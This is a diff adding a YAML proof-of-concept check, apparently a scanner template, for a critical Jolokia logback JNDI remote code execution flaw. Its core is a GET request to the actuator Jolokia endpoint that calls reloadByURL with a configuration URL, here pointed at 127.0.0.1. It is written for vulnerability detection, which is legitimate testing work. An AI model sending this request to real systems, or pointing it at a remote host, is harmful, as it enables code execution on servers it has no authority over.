@@ -1,0 +1,14 @@
+id: poc-yaml-jolokia-logback-jndi-rce
+info:
+  name: jolokia logback JNDI 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: jolokia
+requests:
+- method: GET
+  path: /actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:4321!/upload!/logback.xml
+  expression: status_code == 200 && contains(body,"127.0.0.1:4321") && contains(body,"JMXConfigurator.java")
+    && !contains(body,"<html")
+variables: {}
+transport: http
